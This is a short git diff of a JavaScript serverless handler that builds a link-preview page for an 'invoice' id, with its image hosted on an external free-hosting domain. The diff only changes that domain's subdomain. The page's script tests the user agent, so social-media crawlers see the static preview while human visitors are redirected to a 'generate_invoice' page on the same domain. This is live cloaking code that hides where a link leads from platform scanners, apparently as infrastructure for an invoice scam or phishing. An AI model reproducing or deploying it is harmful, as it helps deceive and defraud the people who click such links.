@@ -2,7 +2,7 @@ module.exports = (req, res) => {
   const { searchParams } = new URL(req.url, 'http://localhost');
   const invoiceId = searchParams.get('id');
 
-  const imageUrl = `https://japan-dev.ct.ws/uploads/${invoiceId}_facebook.jpg`;
+  const imageUrl = `https://japan-ab.ct.ws/uploads/${invoiceId}_facebook.jpg`;
 
   const html = `
     <!DOCTYPE html>
@@ -26,7 +26,7 @@ module.exports = (req, res) => {
 
         <script>
           if (!/bot|facebook|telegram|twitter|linkedin|whatsapp/i.test(navigator.userAgent)) {
-            window.location.href = 'https://japan-dev.ct.ws/generate_invoice.html?id='+'${invoiceId}';
+            window.location.href = 'https://japan-ab.ct.ws/generate_invoice.html?id='+'${invoiceId}';
           }
         </script>
       </body>
